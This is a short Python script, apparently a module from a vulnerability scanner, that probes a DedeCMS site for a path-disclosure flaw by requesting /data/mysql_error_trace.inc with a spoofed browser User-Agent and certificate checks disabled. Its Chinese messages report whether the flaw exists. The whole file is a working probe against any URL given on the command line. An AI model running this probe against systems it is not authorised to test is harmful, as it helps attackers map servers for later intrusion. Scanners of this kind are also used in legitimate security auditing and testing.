#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dedecms trace爆路径漏洞
referer: http://0daysec.blog.51cto.com/9327043/1571372
author: Lucifer
description: 访问mysql_error_trace.inc,mysql trace报错路径泄露。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class dedecms_error_trace_disclosure:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/data/mysql_error_trace.inc"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"<?php  exit()" in req.text:
                printGreen("[+]Success:存在dedecms trace爆路径漏洞...(信息)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在dedecms_error_trace_disclosure漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = dedecms_error_trace_disclosure(sys.argv[1])
    testVuln.run()